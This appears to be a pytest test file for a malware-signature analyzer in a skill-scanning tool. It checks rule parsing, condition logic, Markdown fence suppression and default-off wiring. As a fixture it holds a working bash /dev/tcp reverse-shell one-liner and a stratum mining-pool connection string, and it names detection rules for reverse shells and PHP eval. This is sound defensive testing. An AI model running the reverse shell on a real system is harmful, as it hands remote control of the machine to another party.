"""Tests for the optional signature-rule module (detection class 14).

Mirrors the OSV module's test shape. Because Nexus-Hub reverse-engineered a
self-contained pure-Python matcher instead of wrapping a native YARA binding,
"graceful degrade when YARA is absent" becomes "graceful degrade when the
bundled rules cannot be loaded": the analyzer reports itself skipped and the
rest of the scan is unaffected. No external dependency, no network call.

Coverage: the condition grammar (any/all/N of them, and/or/not, parentheses,
malformed-degrades-safely), rule parsing (meta + strings + condition, malformed
strings skipped, nocase), the bundled rule set, real detection in an executable
script, fence-specific suppression on Markdown, graceful degradation, and the
default-OFF scanner wiring.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from nexus_skill_scanner.analyzers import signatures as sig
from nexus_skill_scanner.analyzers.base import FileUnit
from nexus_skill_scanner.analyzers.signatures import (
    SignatureAnalyzer,
    evaluate_condition,
    load_bundled_rules,
    parse_rules,
)
from nexus_skill_scanner.scanner import Scanner
from nexus_skill_scanner.types import Severity


def _unit(src: str, name: str) -> FileUnit:
    return FileUnit.from_path(Path(name), name, src)


# A bash /dev/tcp connect-back: matched by the bundled reverse_shell_bash_devtcp
# rule (CRITICAL). Reused across the detection and fence-awareness tests.
_REVERSE_SHELL = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"


# ---- Condition grammar ----------------------------------------------------

def test_condition_any_of_them() -> None:
    assert evaluate_condition("any of them", {"$a"}, ["$a", "$b"]) is True
    assert evaluate_condition("any of them", set(), ["$a", "$b"]) is False


def test_condition_all_of_them() -> None:
    assert evaluate_condition("all of them", {"$a", "$b"}, ["$a", "$b"]) is True
    assert evaluate_condition("all of them", {"$a"}, ["$a", "$b"]) is False


def test_condition_n_of_them() -> None:
    assert evaluate_condition("2 of them", {"$a", "$b"}, ["$a", "$b", "$c"]) is True
    assert evaluate_condition("2 of them", {"$a"}, ["$a", "$b", "$c"]) is False


def test_condition_boolean_and_parentheses() -> None:
    ids = ["$a", "$b", "$c"]
    assert evaluate_condition("$a and ($b or $c)", {"$a", "$c"}, ids) is True
    assert evaluate_condition("$a and ($b or $c)", {"$a"}, ids) is False
    assert evaluate_condition("not $a", {"$b"}, ids) is True


def test_condition_malformed_degrades_to_any() -> None:
    # An unparseable condition falls back to the safe "any of them" default
    # rather than raising, so a single bad rule never aborts a scan.
    assert evaluate_condition("$a and of them garbage", {"$a"}, ["$a"]) is True
    assert evaluate_condition("$a and of them garbage", set(), ["$a"]) is False


# ---- Rule parsing ---------------------------------------------------------

_SAMPLE_RULE = """
rule sample_rule
{
    meta:
        severity = "medium"
        description = "a sample rule"
    strings:
        $a = "DangerToken" nocase
        $b = /exec\\s*\\(/
    condition:
        $a and $b
}
"""


def test_parse_rules_reads_meta_strings_condition() -> None:
    rules = parse_rules(_SAMPLE_RULE)
    assert len(rules) == 1
    rule = rules[0]
    assert rule.name == "sample_rule"
    assert rule.severity is Severity.MEDIUM
    assert rule.detection_class == 14  # default when meta omits it
    assert rule.string_ids() == ["$a", "$b"]
    assert rule.condition == "$a and $b"


def test_parse_rules_skips_malformed_string_defs() -> None:
    text = (
        'rule r {\n'
        ' strings:\n'
        '  $ok = "x"\n'
        '  $bad = not_a_string\n'
        ' condition:\n'
        '  any of them\n'
        '}\n'
    )
    rules = parse_rules(text)
    assert rules[0].string_ids() == ["$ok"]


def test_nocase_literal_matches_case_insensitively() -> None:
    rules = parse_rules(_SAMPLE_RULE)
    unit = _unit("dangertoken\nexec(\n", "evil.py")
    findings = SignatureAnalyzer(rules=rules).analyze(unit)
    assert len(findings) == 1
    assert findings[0].severity is Severity.MEDIUM


# ---- Bundled rules + detection -------------------------------------------

def test_bundled_rules_load() -> None:
    rules = load_bundled_rules()
    names = {r.name for r in rules}
    assert "reverse_shell_bash_devtcp" in names
    assert "stratum_mining_pool" in names
    assert "php_eval_request_input" in names
    assert len(rules) >= 10


def test_reverse_shell_in_script_scores_critical() -> None:
    findings = SignatureAnalyzer().analyze(_unit(_REVERSE_SHELL, "payload.sh"))
    assert any(
        f.detection_class == 14 and f.severity is Severity.CRITICAL for f in findings
    )


def test_cryptominer_stratum_detected() -> None:
    unit = _unit('connect("stratum+tcp://pool.example:3333")\n', "miner.py")
    titles = {f.title for f in SignatureAnalyzer().analyze(unit)}
    assert any("stratum_mining_pool" in t for t in titles)


def test_clean_script_has_no_signature_findings() -> None:
    unit = _unit("def add(a, b):\n    return a + b\n", "calc.py")
    assert SignatureAnalyzer().analyze(unit) == []


# ---- Fence awareness ------------------------------------------------------

def test_payload_inside_markdown_fence_is_suppressed() -> None:
    md = f"# Security demo\n\n```sh\n{_REVERSE_SHELL}```\n"
    assert SignatureAnalyzer().analyze(_unit(md, "SKILL.md")) == []


def test_payload_in_markdown_prose_still_matches() -> None:
    # Suppression is fence-specific, not a blanket Markdown exemption: a payload
    # smuggled into prose (outside any fence) is still caught.
    md = f"# Doc\n\nThe attacker runs {_REVERSE_SHELL}\n"
    findings = SignatureAnalyzer().analyze(_unit(md, "SKILL.md"))
    assert any(f.detection_class == 14 for f in findings)


# ---- Graceful degrade (the RE of "simulate YARA absent") ------------------

def test_no_rules_reports_skipped_and_no_findings() -> None:
    analyzer = SignatureAnalyzer(rules=[])
    assert any("yara" in note for note in analyzer.skipped)
    assert analyzer.analyze(_unit(_REVERSE_SHELL, "payload.sh")) == []


# ---- Default-off + scanner integration ------------------------------------

def test_signatures_off_by_default(tmp_path: Path) -> None:
    script = tmp_path / "payload.sh"
    script.write_text(_REVERSE_SHELL, encoding="utf-8")
    result = Scanner().scan([script])
    assert not any(f.title.startswith("Signature match") for f in result.findings)


def test_signatures_enabled_detects_payload(tmp_path: Path) -> None:
    script = tmp_path / "payload.sh"
    script.write_text(_REVERSE_SHELL, encoding="utf-8")
    result = Scanner(enable_signatures=True).scan([script])
    assert any(f.title.startswith("Signature match") for f in result.findings)


def test_scanner_surfaces_signature_skip_note(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Simulate the bundled rules being unavailable; the scanner must surface the
    # analyzer's skipped note rather than failing the scan.
    monkeypatch.setattr(sig, "load_bundled_rules", lambda: [])
    script = tmp_path / "payload.sh"
    script.write_text(_REVERSE_SHELL, encoding="utf-8")
    result = Scanner(enable_signatures=True).scan([script])
    assert any("yara" in note for note in result.skipped_modules)
